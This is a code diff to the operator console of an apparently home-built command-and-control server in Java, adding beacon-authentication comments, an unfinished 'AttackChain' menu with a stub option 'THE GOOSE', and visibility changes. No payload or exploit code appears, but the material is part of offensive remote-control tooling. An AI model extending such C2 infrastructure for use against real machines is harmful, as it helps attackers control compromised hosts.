@@ -1,6 +1,5 @@
 package Servers.C2;
 
-import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.HashMap;
@@ -42,6 +41,16 @@ public class C2ServerUserHandler implements Runnable{
         this.currentUserPath = "";
     }
 
+    /**
+     * This function authenticates new beacons. First, the Password Hash from the Beacon
+     * is compared to the password hash stored. If they match, then the user is prompted
+     * through the CLI to confirm the authentication.
+     * 
+     * @param enteredPasswordHash the hashed password from the Beacon Server
+     * @param IPAddress The IP Address of the Beacon attempting to connect
+     * @return Either 'Authentication Successful', 'Authentication Failed: Incorrect Password', 'Authentication 
+     * Failed: User Denied MFA Prompt', or 'Authentication Failed: Authentication Process could not be completed'
+     */
     protected String authenticateToC2(String enteredPasswordHash, String IPAddress){
         if(enteredPasswordHash.equals(passwordDigest)){
             beaconsWaitingForMFA.put(IPAddress, "Waiting");
@@ -77,7 +86,7 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println(message);
     }
 
-    protected void printHome(){
+    private void printHome(){
         System.out.println(RESET);
         System.out.println("      _..---^---.._         __    __                                                      ");
         System.out.println("     /  /  /   \\ \\ \\       |  |  |  |                                   ");
@@ -89,7 +98,7 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println();
     }
 
-    protected void printCommand(){
+    private void printCommand(){
         System.out.println(RESET);
         System.out.println("       ____                          _________                         __           ");
         System.out.println("       \\   \\                        |   ______|                       |  |             ");
@@ -101,7 +110,16 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println();
     }
 
-    protected void sendCommand(String OS){
+    private void printAttackChain(){
+        // TODO: Ascii Art for the attack chain
+    }
+
+    /**
+     * This Function is used by the CLI for the user to send commands to clients
+     * 
+     * @param OS the Operating System 'Windows' or 'Linux'
+     */
+    private void sendCommand(String OS){
         String color = "";
         if(OS == "Windows"){
             color = BLUE;
@@ -243,14 +261,22 @@ public class C2ServerUserHandler implements Runnable{
                 sendCommand("Windows");
             } else if(currentUserPath.equals("Command Linux")){
                 sendCommand("Linux");
+            } else if(currentUserPath.equals("AttackChain")){
+                printAttackChain();
+                System.out.println("1. THE GOOSE");
+                System.out.println("2. Back");
+                System.out.println();
+                System.out.print(currentUserPath + " >> ");
+                userInput = userInputScanner.nextLine();
+                if(userInput.equals("1")){
+                    // TODO: Figure out how to launch the goose.
+                } else if (userInput.equals("2")){
+                    currentUserPath = "";
+                } else {
+                    System.out.println("Invalid Input");
+                }
             }
         }
-    }
-
-    public static void main(String[] args) throws IOException {
-        C2Server server = new C2Server();
-        C2ServerUserHandler cli = new C2ServerUserHandler(server);
-        cli.run();
     }
 }
 
